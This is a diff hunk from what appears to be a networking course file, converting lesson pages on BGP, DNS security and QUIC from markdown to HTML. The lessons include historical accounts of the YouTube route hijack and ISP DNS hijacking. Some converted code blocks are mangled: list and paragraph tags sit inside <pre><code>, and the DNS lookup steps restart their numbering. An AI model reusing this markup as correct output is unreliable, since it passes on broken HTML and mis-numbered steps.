@@ -7067,108 +7722,134 @@ You have a web app that loads slowly. Users complain about 3-second page loads. 
     pages: [
       {
         titleEn: "iBGP vs eBGP — How the Internet Routes",
-        contentEn: `**BGP (Border Gateway Protocol)** is how the internet works. Every ISP, cloud provider, and large company uses it.
+        contentEn: `<p><strong>BGP (Border Gateway Protocol)</strong> is how the internet works. Every ISP, cloud provider, and large company uses it.</p>
 
-**Two types:**
+<p><strong>Two types:</strong></p>
 
-| Feature | iBGP | eBGP |
-|---|---|---|
-| Between | Routers in SAME AS | Routers in DIFFERENT AS |
-| AS = | Autonomous System (one organization) | — |
-| TTL | 255 (multihop OK) | 1 (direct neighbor only, unless multihop set) |
-| Next-hop | Does NOT change | Changes to peer's address |
-| Full mesh? | Required (or use Route Reflector) | No, just peer with neighbor |
-| AD value | 200 (less trusted) | 20 (more trusted) |
+<table>
+<thead><tr><th>Feature</th><th>iBGP</th><th>eBGP</th></tr></thead>
+<tbody>
+<tr><td>Between</td><td>Routers in SAME AS</td><td>Routers in DIFFERENT AS</td></tr>
+<tr><td>AS =</td><td>Autonomous System (one organization)</td><td>—</td></tr>
+<tr><td>TTL</td><td>255 (multihop OK)</td><td>1 (direct neighbor only, unless multihop set)</td></tr>
+<tr><td>Next-hop</td><td>Does NOT change</td><td>Changes to peer's address</td></tr>
+<tr><td>Full mesh?</td><td>Required (or use Route Reflector)</td><td>No, just peer with neighbor</td></tr>
+<tr><td>AD value</td><td>200 (less trusted)</td><td>20 (more trusted)</td></tr>
+</tbody></table>
 
-**AS (Autonomous System):**
-- Every ISP/org gets an AS Number (ASN)
-- Example: Google = AS15169, Cloudflare = AS13335
-- AS numbers are assigned by IANA → RIRs (ARIN, RIPE, etc.)
+<p><strong>AS (Autonomous System):</strong></p>
+<ul>
+<li>Every ISP/org gets an AS Number (ASN)</li>
+<li>Example: Google = AS15169, Cloudflare = AS13335</li>
+<li>AS numbers are assigned by IANA → RIRs (ARIN, RIPE, etc.)</li>
+</ul>
 
-**BGP is a path-vector protocol:**
-- Each route carries the full AS path: "to reach 8.8.8.0/24, go through AS3356 → AS15169"
-- Loop prevention: if a router sees its own ASN in the path, it drops the route
-- No automatic discovery — you manually configure each neighbor
+<p><strong>BGP is a path-vector protocol:</strong></p>
+<ul>
+<li>Each route carries the full AS path: "to reach 8.8.8.0/24, go through AS3356 → AS15169"</li>
+<li>Loop prevention: if a router sees its own ASN in the path, it drops the route</li>
+<li>No automatic discovery — you manually configure each neighbor</li>
+</ul>
 
-**BGP messages:**
-- **OPEN** — start session, exchange AS numbers and capabilities
-- **UPDATE** — announce new routes or withdraw old ones
-- **KEEPALIVE** — "I'm still here" (every 60 seconds)
-- **NOTIFICATION** — error, session will close`
+<p><strong>BGP messages:</strong></p>
+<ul>
+<li><strong>OPEN</strong> — start session, exchange AS numbers and capabilities</li>
+<li><strong>UPDATE</strong> — announce new routes or withdraw old ones</li>
+<li><strong>KEEPALIVE</strong> — "I'm still here" (every 60 seconds)</li>
+<li><strong>NOTIFICATION</strong> — error, session will close</li>
+</ul>`
       },
       {
         titleEn: "Path Selection — 13 Criteria",
-        contentEn: `When BGP has multiple paths to the same destination, it picks the best one. The selection follows a strict order — first match wins.
+        contentEn: `<p>When BGP has multiple paths to the same destination, it picks the best one. The selection follows a strict order — first match wins.</p>
 
-**BGP Best Path Selection (in order):**
+<p><strong>BGP Best Path Selection (in order):</strong></p>
 
-| # | Criteria | Higher or Lower wins? | Who controls it? |
-|---|---|---|---|
-| 1 | **Weight** | Higher wins | Local router only (Cisco proprietary) |
-| 2 | **Local Preference** | Higher wins | Your AS (iBGP) |
-| 3 | **Locally originated** | Self-originated wins | Local router |
-| 4 | **AS Path length** | Shorter wins | All ASes in path |
-| 5 | **Origin type** | IGP < EGP < Incomplete | Origin AS |
-| 6 | **MED** (Multi-Exit Discriminator) | Lower wins | Neighbor AS (suggestion) |
-| 7 | **eBGP over iBGP** | eBGP wins | Topology |
-| 8 | **Lowest IGP metric** | Lower wins | Internal routing |
-| 9 | **Oldest route** | Older wins | Stability |
-| 10 | **Lowest Router ID** | Lower wins | Router config |
-| 11 | **Shortest cluster list** | Shorter wins | Route Reflectors |
-| 12 | **Lowest neighbor address** | Lower wins | Peer IP |
-| 13 | **Lowest peer Router ID** | Lower wins | Peer config |
+<table>
+<thead><tr><th>#</th><th>Criteria</th><th>Higher or Lower wins?</th><th>Who controls it?</th></tr></thead>
+<tbody>
+<tr><td>1</td><td><strong>Weight</strong></td><td>Higher wins</td><td>Local router only (Cisco proprietary)</td></tr>
+<tr><td>2</td><td><strong>Local Preference</strong></td><td>Higher wins</td><td>Your AS (iBGP)</td></tr>
+<tr><td>3</td><td><strong>Locally originated</strong></td><td>Self-originated wins</td><td>Local router</td></tr>
+<tr><td>4</td><td><strong>AS Path length</strong></td><td>Shorter wins</td><td>All ASes in path</td></tr>
+<tr><td>5</td><td><strong>Origin type</strong></td><td>IGP < EGP < Incomplete</td><td>Origin AS</td></tr>
+<tr><td>6</td><td><strong>MED</strong> (Multi-Exit Discriminator)</td><td>Lower wins</td><td>Neighbor AS (suggestion)</td></tr>
+<tr><td>7</td><td><strong>eBGP over iBGP</strong></td><td>eBGP wins</td><td>Topology</td></tr>
+<tr><td>8</td><td><strong>Lowest IGP metric</strong></td><td>Lower wins</td><td>Internal routing</td></tr>
+<tr><td>9</td><td><strong>Oldest route</strong></td><td>Older wins</td><td>Stability</td></tr>
+<tr><td>10</td><td><strong>Lowest Router ID</strong></td><td>Lower wins</td><td>Router config</td></tr>
+<tr><td>11</td><td><strong>Shortest cluster list</strong></td><td>Shorter wins</td><td>Route Reflectors</td></tr>
+<tr><td>12</td><td><strong>Lowest neighbor address</strong></td><td>Lower wins</td><td>Peer IP</td></tr>
+<tr><td>13</td><td><strong>Lowest peer Router ID</strong></td><td>Lower wins</td><td>Peer config</td></tr>
+</tbody></table>
 
-**The ones that matter most (daily use):**
-- **Weight** — override everything locally (lab/emergency)
-- **Local Preference** — "our AS prefers this path" (most common tuning)
-- **AS Path** — prepend your ASN multiple times to make a path look longer (traffic engineering)
-- **MED** — "dear neighbor, please enter our network through this link"
+<p><strong>The ones that matter most (daily use):</strong></p>
+<ul>
+<li><strong>Weight</strong> — override everything locally (lab/emergency)</li>
+<li><strong>Local Preference</strong> — "our AS prefers this path" (most common tuning)</li>
+<li><strong>AS Path</strong> — prepend your ASN multiple times to make a path look longer (traffic engineering)</li>
+<li><strong>MED</strong> — "dear neighbor, please enter our network through this link"</li>
+</ul>
 
-**Example:**
-- You have two ISPs: ISP-A (cheap) and ISP-B (fast)
-- Set Local Preference 200 for ISP-B routes → all outbound traffic uses ISP-B
-- Prepend your ASN on ISP-A announcements → inbound traffic prefers ISP-B`
+<p><strong>Example:</strong></p>
+<ul>
+<li>You have two ISPs: ISP-A (cheap) and ISP-B (fast)</li>
+<li>Set Local Preference 200 for ISP-B routes → all outbound traffic uses ISP-B</li>
+<li>Prepend your ASN on ISP-A announcements → inbound traffic prefers ISP-B</li>
+</ul>`
       },
       {
         titleEn: "Story: Pakistan Took Down YouTube (2008)",
         contentEn: `{story}
 
-**February 24, 2008 — Pakistan Telecom hijacks YouTube**
+<p><strong>February 24, 2008 — Pakistan Telecom hijacks YouTube</strong></p>
 
-The Pakistan government ordered ISPs to block YouTube (over a controversial video).
+<p>The Pakistan government ordered ISPs to block YouTube (over a controversial video).</p>
 
-**What Pakistan Telecom did:**
-- YouTube's IP range: 208.65.153.0/24
-- Pakistan Telecom announced a MORE SPECIFIC route: 208.65.153.0/25
-- BGP rule: more specific prefix always wins (a /25 beats a /24)
+<p><strong>What Pakistan Telecom did:</strong></p>
+<ul>
+<li>YouTube's IP range: 208.65.153.0/24</li>
+<li>Pakistan Telecom announced a MORE SPECIFIC route: 208.65.153.0/25</li>
+<li>BGP rule: more specific prefix always wins (a /25 beats a /24)</li>
+</ul>
 
-**What happened next:**
-- Pakistan Telecom's route leaked to their upstream provider (PCCW, AS3491)
-- PCCW accepted it and announced it to the entire internet
-- Within 2 minutes, most of the world's traffic to YouTube went to Pakistan
-- Pakistan Telecom had no YouTube servers → black hole
-- **YouTube was down worldwide for about 2 hours**
+<p><strong>What happened next:</strong></p>
+<ul>
+<li>Pakistan Telecom's route leaked to their upstream provider (PCCW, AS3491)</li>
+<li>PCCW accepted it and announced it to the entire internet</li>
+<li>Within 2 minutes, most of the world's traffic to YouTube went to Pakistan</li>
+<li>Pakistan Telecom had no YouTube servers → black hole</li>
+<li><strong>YouTube was down worldwide for about 2 hours</strong></li>
+</ul>
 
-**The fix (manual):**
-- YouTube announced even more specific routes: two /25s covering their /24
-- Engineers contacted PCCW to filter the fake route
-- Service restored after ~2 hours
+<p><strong>The fix (manual):</strong></p>
+<ul>
+<li>YouTube announced even more specific routes: two /25s covering their /24</li>
+<li>Engineers contacted PCCW to filter the fake route</li>
+<li>Service restored after ~2 hours</li>
+</ul>
 
-**Why BGP allowed this:**
-- BGP is built on **trust** — there was no verification in 2008
-- Any AS could announce any prefix
-- No one checked if Pakistan Telecom actually owned 208.65.153.0/24
+<p><strong>Why BGP allowed this:</strong></p>
+<ul>
+<li>BGP is built on <strong>trust</strong> — there was no verification in 2008</li>
+<li>Any AS could announce any prefix</li>
+<li>No one checked if Pakistan Telecom actually owned 208.65.153.0/24</li>
+</ul>
 
-**What changed after:**
-- **RPKI (Resource Public Key Infrastructure)** — cryptographic proof of prefix ownership
-- **IRR (Internet Routing Registry)** — databases of who owns what
-- **BGP communities** — signal intent ("don't export this route")
-- But adoption is still slow — in 2024, only ~50% of routes are RPKI-signed
+<p><strong>What changed after:</strong></p>
+<ul>
+<li><strong>RPKI (Resource Public Key Infrastructure)</strong> — cryptographic proof of prefix ownership</li>
+<li><strong>IRR (Internet Routing Registry)</strong> — databases of who owns what</li>
+<li><strong>BGP communities</strong> — signal intent ("don't export this route")</li>
+<li>But adoption is still slow — in 2024, only ~50% of routes are RPKI-signed</li>
+</ul>
 
 {questions}
-1. Why does a /25 route win over a /24 for the same IP space?
-2. If you run an AS and want to protect against hijacking, what two things should you set up?
-3. Why can't BGP just reject routes from ASes that don't own the prefix?`
+<ol>
+<li>Why does a /25 route win over a /24 for the same IP space?</li>
+<li>If you run an AS and want to protect against hijacking, what two things should you set up?</li>
+<li>Why can't BGP just reject routes from ASes that don't own the prefix?</li>
+</ol>`
       }
     ]
   },
@@ -7178,127 +7859,160 @@ The Pakistan government ordered ISPs to block YouTube (over a controversial vide
     pages: [
       {
         titleEn: "Recursive Resolution — Every Step",
-        contentEn: `When you type **www.example.com** in your browser, here is exactly what happens.
+        contentEn: `<p>When you type <strong>www.example.com</strong> in your browser, here is exactly what happens.</p>
 
-**The 5 actors:**
-1. **Your computer** (stub resolver) — asks, doesn't resolve itself
-2. **Recursive resolver** (ISP or 8.8.8.8) — does all the work
-3. **Root nameserver** — knows where .com/.org/.net live (13 root server clusters)
-4. **TLD nameserver** — knows where example.com's nameserver is
-5. **Authoritative nameserver** — has the actual answer
+<p><strong>The 5 actors:</strong></p>
+<ol>
+<li><strong>Your computer</strong> (stub resolver) — asks, doesn't resolve itself</li>
+<li><strong>Recursive resolver</strong> (ISP or 8.8.8.8) — does all the work</li>
+<li><strong>Root nameserver</strong> — knows where .com/.org/.net live (13 root server clusters)</li>
+<li><strong>TLD nameserver</strong> — knows where example.com's nameserver is</li>
+<li><strong>Authoritative nameserver</strong> — has the actual answer</li>
+</ol>
 
-**Step by step — resolving www.example.com:**
+<p><strong>Step by step — resolving www.example.com:</strong></p>
 
-\`\`\`
-1. Browser → OS cache → not found
-2. OS → Recursive resolver (e.g., 8.8.8.8): "what is www.example.com?"
-3. Resolver checks its cache → not found
-4. Resolver → Root server (a.root-servers.net): "what is www.example.com?"
-   Root says: "I don't know, but .com is handled by a.gtld-servers.net"
-5. Resolver → TLD server (a.gtld-servers.net): "what is www.example.com?"
-   TLD says: "example.com uses ns1.example.com (93.184.216.34)"
-6. Resolver → Authoritative (ns1.example.com): "what is www.example.com?"
-   Auth says: "www.example.com = 93.184.216.34, TTL=3600"
-7. Resolver caches the answer for 3600 seconds
-8. Resolver → Your computer: "93.184.216.34"
-9. Browser connects to 93.184.216.34
-\`\`\`
+<pre><code>1. Browser → OS cache → not found
+<ol>
+<li>OS → Recursive resolver (e.g., 8.8.8.8): "what is www.example.com?"</li>
+<li>Resolver checks its cache → not found</li>
+<li>Resolver → Root server (a.root-servers.net): "what is www.example.com?"</li>
+</ol>
+<p>Root says: "I don't know, but .com is handled by a.gtld-servers.net"</p>
+<ol>
+<li>Resolver → TLD server (a.gtld-servers.net): "what is www.example.com?"</li>
+</ol>
+<p>TLD says: "example.com uses ns1.example.com (93.184.216.34)"</p>
+<ol>
+<li>Resolver → Authoritative (ns1.example.com): "what is www.example.com?"</li>
+</ol>
+<p>Auth says: "www.example.com = 93.184.216.34, TTL=3600"</p>
+<ol>
+<li>Resolver caches the answer for 3600 seconds</li>
+<li>Resolver → Your computer: "93.184.216.34"</li>
+<li>Browser connects to 93.184.216.34</li>
+</ol>
+</code></pre>
 
-**Record types:**
-- **A** — domain → IPv4 address
-- **AAAA** — domain → IPv6 address
-- **CNAME** — domain → another domain (alias)
-- **MX** — domain → mail server
-- **NS** — domain → nameserver
-- **TXT** — arbitrary text (SPF, DKIM, verification)
-- **SOA** — zone metadata (serial, refresh, retry, expire)`
+<p><strong>Record types:</strong></p>
+<ul>
+<li><strong>A</strong> — domain → IPv4 address</li>
+<li><strong>AAAA</strong> — domain → IPv6 address</li>
+<li><strong>CNAME</strong> — domain → another domain (alias)</li>
+<li><strong>MX</strong> — domain → mail server</li>
+<li><strong>NS</strong> — domain → nameserver</li>
+<li><strong>TXT</strong> — arbitrary text (SPF, DKIM, verification)</li>
+<li><strong>SOA</strong> — zone metadata (serial, refresh, retry, expire)</li>
+</ul>`
       },
       {
         titleEn: "DNS Security — DNSSEC, DoH, DoT",
-        contentEn: `**DNS was designed without security.** Everything is plaintext. Anyone can forge responses.
+        contentEn: `<p><strong>DNS was designed without security.</strong> Everything is plaintext. Anyone can forge responses.</p>
 
-**Three security layers:**
+<p><strong>Three security layers:</strong></p>
 
-**1. DNSSEC (DNS Security Extensions):**
-- Adds **digital signatures** to DNS responses
-- Chain of trust: Root → .com → example.com (each signs the next)
-- New record types: RRSIG (signature), DNSKEY (public key), DS (delegation signer)
-- Protects against: **forged responses** (cache poisoning)
-- Does NOT encrypt — queries are still visible
-- Does NOT protect against: snooping on your queries
+<p><strong>1. DNSSEC (DNS Security Extensions):</strong></p>
+<ul>
+<li>Adds <strong>digital signatures</strong> to DNS responses</li>
+<li>Chain of trust: Root → .com → example.com (each signs the next)</li>
+<li>New record types: RRSIG (signature), DNSKEY (public key), DS (delegation signer)</li>
+<li>Protects against: <strong>forged responses</strong> (cache poisoning)</li>
+<li>Does NOT encrypt — queries are still visible</li>
+<li>Does NOT protect against: snooping on your queries</li>
+</ul>
 
-**2. DoH (DNS over HTTPS):**
-- DNS queries inside normal HTTPS (port 443)
-- Looks like regular web traffic — hard to block or snoop
-- Used by: Firefox (Cloudflare), Chrome (Google), browsers
-- Protects against: **ISP snooping**, network-level blocking
-- Controversy: bypasses corporate/parental DNS filters
+<p><strong>2. DoH (DNS over HTTPS):</strong></p>
+<ul>
+<li>DNS queries inside normal HTTPS (port 443)</li>
+<li>Looks like regular web traffic — hard to block or snoop</li>
+<li>Used by: Firefox (Cloudflare), Chrome (Google), browsers</li>
+<li>Protects against: <strong>ISP snooping</strong>, network-level blocking</li>
+<li>Controversy: bypasses corporate/parental DNS filters</li>
+</ul>
 
-**3. DoT (DNS over TLS):**
-- DNS queries encrypted with TLS (port 853)
-- Dedicated port — easy to identify and block
-- Used by: Android (Private DNS), system-level resolvers
-- Protects against: **snooping** (same as DoH)
-- Easier for admins to manage than DoH
+<p><strong>3. DoT (DNS over TLS):</strong></p>
+<ul>
+<li>DNS queries encrypted with TLS (port 853)</li>
+<li>Dedicated port — easy to identify and block</li>
+<li>Used by: Android (Private DNS), system-level resolvers</li>
+<li>Protects against: <strong>snooping</strong> (same as DoH)</li>
+<li>Easier for admins to manage than DoH</li>
+</ul>
 
-**Comparison:**
+<p><strong>Comparison:</strong></p>
 
-| Feature | Plain DNS | DNSSEC | DoH | DoT |
-|---|---|---|---|---|
-| Encrypted? | No | No | Yes | Yes |
-| Verified? | No | Yes | No* | No* |
-| Port | 53 | 53 | 443 | 853 |
-| Blockable? | Yes | Yes | Hard | Easy |
+<table>
+<thead><tr><th>Feature</th><th>Plain DNS</th><th>DNSSEC</th><th>DoH</th><th>DoT</th></tr></thead>
+<tbody>
+<tr><td>Encrypted?</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td></tr>
+<tr><td>Verified?</td><td>No</td><td>Yes</td><td>No*</td><td>No*</td></tr>
+<tr><td>Port</td><td>53</td><td>53</td><td>443</td><td>853</td></tr>
+<tr><td>Blockable?</td><td>Yes</td><td>Yes</td><td>Hard</td><td>Easy</td></tr>
+</tbody></table>
 
-*DoH/DoT can use DNSSEC too — they're complementary.`
+<p>*DoH/DoT can use DNSSEC too — they're complementary.</p>`
       },
       {
         titleEn: "Story: ISP DNS Hijacking",
         contentEn: `{story}
 
-**How ISPs Secretly Redirected Your Web Traffic**
+<p><strong>How ISPs Secretly Redirected Your Web Traffic</strong></p>
 
-In the late 2000s, many ISPs discovered a way to make money from your typos.
+<p>In the late 2000s, many ISPs discovered a way to make money from your typos.</p>
 
-**Normal behavior:**
-- You type "gogle.com" (typo) in browser
-- DNS resolver returns NXDOMAIN (domain not found)
-- Browser shows error page
+<p><strong>Normal behavior:</strong></p>
+<ul>
+<li>You type "gogle.com" (typo) in browser</li>
+<li>DNS resolver returns NXDOMAIN (domain not found)</li>
+<li>Browser shows error page</li>
+</ul>
 
-**What ISPs did:**
-- Instead of returning NXDOMAIN, they returned their OWN IP address
-- Your browser loaded the ISP's search page — full of ads
-- ISP earned ad revenue from your mistakes
-- Some ISPs did this for ALL failed DNS queries
+<p><strong>What ISPs did:</strong></p>
+<ul>
+<li>Instead of returning NXDOMAIN, they returned their OWN IP address</li>
+<li>Your browser loaded the ISP's search page — full of ads</li>
+<li>ISP earned ad revenue from your mistakes</li>
+<li>Some ISPs did this for ALL failed DNS queries</li>
+</ul>
 
-**It got worse:**
-- Some ISPs injected ads into ANY HTTP page (not just errors)
-- They modified DNS responses to redirect through their proxy
-- The proxy added ad banners to pages you visited
-- This broke many applications that relied on NXDOMAIN responses
+<p><strong>It got worse:</strong></p>
+<ul>
+<li>Some ISPs injected ads into ANY HTTP page (not just errors)</li>
+<li>They modified DNS responses to redirect through their proxy</li>
+<li>The proxy added ad banners to pages you visited</li>
+<li>This broke many applications that relied on NXDOMAIN responses</li>
+</ul>
 
-**Real examples:**
-- **Comcast (2009)** — redirected NXDOMAIN to search pages
-- **Charter (2008)** — injected JavaScript ads into non-customer pages
-- **Multiple ISPs in Asia** — full DNS hijacking for ad injection
+<p><strong>Real examples:</strong></p>
+<ul>
+<li><strong>Comcast (2009)</strong> — redirected NXDOMAIN to search pages</li>
+<li><strong>Charter (2008)</strong> — injected JavaScript ads into non-customer pages</li>
+<li><strong>Multiple ISPs in Asia</strong> — full DNS hijacking for ad injection</li>
+</ul>
 
-**Why it worked:**
-- DNS is plaintext on port 53
-- ISP controls the recursive resolver
-- Most users use their ISP's default DNS
+<p><strong>Why it worked:</strong></p>
+<ul>
+<li>DNS is plaintext on port 53</li>
+<li>ISP controls the recursive resolver</li>
+<li>Most users use their ISP's default DNS</li>
+</ul>
 
-**How users fought back:**
-- Switched to 8.8.8.8 (Google) or 1.1.1.1 (Cloudflare)
-- Enabled DoH/DoT — ISP can't modify encrypted DNS
-- DNSSEC adoption increased — forged responses are rejected
+<p><strong>How users fought back:</strong></p>
+<ul>
+<li>Switched to 8.8.8.8 (Google) or 1.1.1.1 (Cloudflare)</li>
+<li>Enabled DoH/DoT — ISP can't modify encrypted DNS</li>
+<li>DNSSEC adoption increased — forged responses are rejected</li>
+</ul>
 
-**The bigger lesson:**
-- Your ISP can see and modify ALL your plaintext DNS queries
-- This is why encrypted DNS (DoH/DoT) matters
-- "If you don't control your DNS, you don't control your internet"
+<p><strong>The bigger lesson:</strong></p>
+<ul>
+<li>Your ISP can see and modify ALL your plaintext DNS queries</li>
+<li>This is why encrypted DNS (DoH/DoT) matters</li>
+<li>"If you don't control your DNS, you don't control your internet"</li>
+</ul>
 
 {simulation}
-You are a network admin. A user reports that typing any non-existent domain shows a strange search page instead of an error. The user is using the company DNS server (192.168.1.1). What steps do you take to diagnose this? What could cause it?`
+<p>You are a network admin. A user reports that typing any non-existent domain shows a strange search page instead of an error. The user is using the company DNS server (192.168.1.1). What steps do you take to diagnose this? What could cause it?</p>`
       }
     ]
   },
@@ -7308,141 +8022,167 @@ You are a network admin. A user reports that typing any non-existent domain show
     pages: [
       {
         titleEn: "The Problem HTTP/2 Didn't Solve",
-        contentEn: `**HTTP/2 fixed many things. But one critical problem remained: Head-of-Line (HOL) blocking at the TCP layer.**
+        contentEn: `<p><strong>HTTP/2 fixed many things. But one critical problem remained: Head-of-Line (HOL) blocking at the TCP layer.</strong></p>
 
-**What HTTP/2 gave us:**
-- Multiplexing — multiple requests on one TCP connection
-- Header compression (HPACK)
-- Server push
-- Stream prioritization
+<p><strong>What HTTP/2 gave us:</strong></p>
+<ul>
+<li>Multiplexing — multiple requests on one TCP connection</li>
+<li>Header compression (HPACK)</li>
+<li>Server push</li>
+<li>Stream prioritization</li>
+</ul>
 
-**The HOL blocking problem:**
+<p><strong>The HOL blocking problem:</strong></p>
 
-\`\`\`
-HTTP/2 multiplexes streams over ONE TCP connection:
+<pre><code>HTTP/2 multiplexes streams over ONE TCP connection:
 
-Stream 1: [packet A] [packet B] [packet C]
-Stream 2: [packet D] [packet E] [packet F]
-Stream 3: [packet G] [packet H] [packet I]
+<p>Stream 1: [packet A] [packet B] [packet C]</p>
+<p>Stream 2: [packet D] [packet E] [packet F]</p>
+<p>Stream 3: [packet G] [packet H] [packet I]</p>
 
-All mixed into one TCP byte stream:
-TCP: [A][D][G][B][E][H][C][F][I]
+<p>All mixed into one TCP byte stream:</p>
+<p>TCP: [A][D][G][B][E][H][C][F][I]</p>
 
-If packet D is lost:
-TCP: [A][ ? ][G][B][E][H][C][F][I]
-              ↑ TCP stops HERE — waits for D to be retransmitted
-              Streams 1 and 3 are BLOCKED even though their packets arrived fine
-\`\`\`
+<p>If packet D is lost:</p>
+<p>TCP: [A][ ? ][G][B][E][H][C][F][I]</p>
+<p>↑ TCP stops HERE — waits for D to be retransmitted</p>
+<p>Streams 1 and 3 are BLOCKED even though their packets arrived fine</p>
+</code></pre>
 
-**Why this happens:**
-- TCP guarantees **in-order delivery** of bytes
-- TCP doesn't know about HTTP/2 streams
-- One lost packet blocks ALL streams on that connection
-- On lossy networks (mobile, Wi-Fi), this happens often
+<p><strong>Why this happens:</strong></p>
+<ul>
+<li>TCP guarantees <strong>in-order delivery</strong> of bytes</li>
+<li>TCP doesn't know about HTTP/2 streams</li>
+<li>One lost packet blocks ALL streams on that connection</li>
+<li>On lossy networks (mobile, Wi-Fi), this happens often</li>
+</ul>
 
-**The irony:**
-- HTTP/1.1 used 6 parallel TCP connections → loss on one didn't block others
-- HTTP/2 uses 1 TCP connection → loss blocks everything
-- On lossy networks, HTTP/2 can be SLOWER than HTTP/1.1
+<p><strong>The irony:</strong></p>
+<ul>
+<li>HTTP/1.1 used 6 parallel TCP connections → loss on one didn't block others</li>
+<li>HTTP/2 uses 1 TCP connection → loss blocks everything</li>
+<li>On lossy networks, HTTP/2 can be SLOWER than HTTP/1.1</li>
+</ul>
 
-**This is why QUIC was created:**
-- QUIC runs over UDP (not TCP)
-- Each stream is independent — loss in one stream doesn't block others
-- QUIC handles reliability per-stream, not per-connection`
+<p><strong>This is why QUIC was created:</strong></p>
+<ul>
+<li>QUIC runs over UDP (not TCP)</li>
+<li>Each stream is independent — loss in one stream doesn't block others</li>
+<li>QUIC handles reliability per-stream, not per-connection</li>
+</ul>`
       },
       {
         titleEn: "QUIC — 0-RTT and Connection Migration",
-        contentEn: `**QUIC = UDP + reliability + encryption + multiplexing. All built-in.**
+        contentEn: `<p><strong>QUIC = UDP + reliability + encryption + multiplexing. All built-in.</strong></p>
 
-**Key features:**
+<p><strong>Key features:</strong></p>
 
-**1. 0-RTT Connection Setup:**
-\`\`\`
-TCP + TLS 1.3:          QUIC (first time):       QUIC (repeat):
-Client → SYN            Client → Initial         Client → 0-RTT data
-Server → SYN+ACK        (crypto + data combined)  (send data immediately!)
-Client → ACK            Server → Handshake        Server → response
-Client → ClientHello    Client → ready
-Server → ServerHello    = 1 RTT total             = 0 RTT total
-Client → ready
-= 3 RTT total
-\`\`\`
+<p><strong>1. 0-RTT Connection Setup:</strong></p>
+<pre><code>TCP + TLS 1.3:          QUIC (first time):       QUIC (repeat):
+<p>Client → SYN            Client → Initial         Client → 0-RTT data</p>
+<p>Server → SYN+ACK        (crypto + data combined)  (send data immediately!)</p>
+<p>Client → ACK            Server → Handshake        Server → response</p>
+<p>Client → ClientHello    Client → ready</p>
+<p>Server → ServerHello    = 1 RTT total             = 0 RTT total</p>
+<p>Client → ready</p>
+<p>= 3 RTT total</p>
+</code></pre>
 
-- First connection: 1 RTT (TLS handshake + transport setup combined)
-- Repeat connection: 0 RTT (send data in the first packet!)
-- TCP+TLS needs 2-3 RTT before sending any data
+<ul>
+<li>First connection: 1 RTT (TLS handshake + transport setup combined)</li>
+<li>Repeat connection: 0 RTT (send data in the first packet!)</li>
+<li>TCP+TLS needs 2-3 RTT before sending any data</li>
+</ul>
 
-**2. No HOL Blocking:**
-- Each QUIC stream has its own sequence numbers
-- Lost packet in Stream 2 → only Stream 2 waits
-- Streams 1 and 3 continue without delay
+<p><strong>2. No HOL Blocking:</strong></p>
+<ul>
+<li>Each QUIC stream has its own sequence numbers</li>
+<li>Lost packet in Stream 2 → only Stream 2 waits</li>
+<li>Streams 1 and 3 continue without delay</li>
+</ul>
 
-**3. Connection Migration:**
-- TCP connection = (source IP, source port, dest IP, dest port)
-- Change Wi-Fi → 4G? New IP = new TCP connection = start over
-- QUIC uses a **Connection ID** instead
-- Switch networks → same Connection ID → connection continues
-- Your video call doesn't drop when you walk from Wi-Fi to cellular
+<p><strong>3. Connection Migration:</strong></p>
+<ul>
+<li>TCP connection = (source IP, source port, dest IP, dest port)</li>
+<li>Change Wi-Fi → 4G? New IP = new TCP connection = start over</li>
+<li>QUIC uses a <strong>Connection ID</strong> instead</li>
+<li>Switch networks → same Connection ID → connection continues</li>
+<li>Your video call doesn't drop when you walk from Wi-Fi to cellular</li>
+</ul>
 
-**4. Always Encrypted:**
-- TLS 1.3 is built into QUIC — not optional
-- Even packet headers are partially encrypted
-- Middleboxes (firewalls, NATs) can't inspect or modify QUIC traffic
+<p><strong>4. Always Encrypted:</strong></p>
+<ul>
+<li>TLS 1.3 is built into QUIC — not optional</li>
+<li>Even packet headers are partially encrypted</li>
+<li>Middleboxes (firewalls, NATs) can't inspect or modify QUIC traffic</li>
+</ul>
 
-**QUIC vs TCP comparison:**
+<p><strong>QUIC vs TCP comparison:</strong></p>
 
-| Feature | TCP + TLS | QUIC |
-|---|---|---|
-| Transport | TCP (kernel) | UDP (userspace) |
-| Encryption | Optional (TLS on top) | Built-in (always TLS 1.3) |
-| Handshake | 2-3 RTT | 1 RTT (0 RTT repeat) |
-| HOL blocking | Yes (connection level) | No (stream level) |
-| Connection migration | No | Yes (Connection ID) |
-| Deployed by | OS kernel update | Application update |`
+<table>
+<thead><tr><th>Feature</th><th>TCP + TLS</th><th>QUIC</th></tr></thead>
+<tbody>
+<tr><td>Transport</td><td>TCP (kernel)</td><td>UDP (userspace)</td></tr>
+<tr><td>Encryption</td><td>Optional (TLS on top)</td><td>Built-in (always TLS 1.3)</td></tr>
+<tr><td>Handshake</td><td>2-3 RTT</td><td>1 RTT (0 RTT repeat)</td></tr>
+<tr><td>HOL blocking</td><td>Yes (connection level)</td><td>No (stream level)</td></tr>
+<tr><td>Connection migration</td><td>No</td><td>Yes (Connection ID)</td></tr>
+<tr><td>Deployed by</td><td>OS kernel update</td><td>Application update</td></tr>
+</tbody></table>`
       },
       {
         titleEn: "Story: Google Built QUIC Quietly",
         contentEn: `{story}
 
-**How Google Shipped a New Internet Protocol Without Anyone Noticing**
+<p><strong>How Google Shipped a New Internet Protocol Without Anyone Noticing</strong></p>
 
-In 2012, Google had a problem. TCP was too slow for their services, especially on mobile networks. But changing TCP meant changing every operating system kernel in the world.
+<p>In 2012, Google had a problem. TCP was too slow for their services, especially on mobile networks. But changing TCP meant changing every operating system kernel in the world.</p>
 
-**Google's clever solution:**
-- Build a new protocol on top of **UDP**
-- UDP is simple — the kernel just passes packets through
-- All the logic lives in **userspace** (Chrome browser + Google servers)
-- No kernel changes needed. No OS updates needed.
+<p><strong>Google's clever solution:</strong></p>
+<ul>
+<li>Build a new protocol on top of <strong>UDP</strong></li>
+<li>UDP is simple — the kernel just passes packets through</li>
+<li>All the logic lives in <strong>userspace</strong> (Chrome browser + Google servers)</li>
+<li>No kernel changes needed. No OS updates needed.</li>
+</ul>
 
-**The timeline:**
-- **2012** — Jim Roskind at Google starts QUIC experiment
-- **2013** — QUIC enabled in Chrome (hidden, experimental)
-- **2014** — Google silently routes Chrome → Google services over QUIC
-- By 2015, **~50% of Chrome-to-Google traffic** used QUIC
-- Most users had no idea they were using a new protocol
+<p><strong>The timeline:</strong></p>
+<ul>
+<li><strong>2012</strong> — Jim Roskind at Google starts QUIC experiment</li>
+<li><strong>2013</strong> — QUIC enabled in Chrome (hidden, experimental)</li>
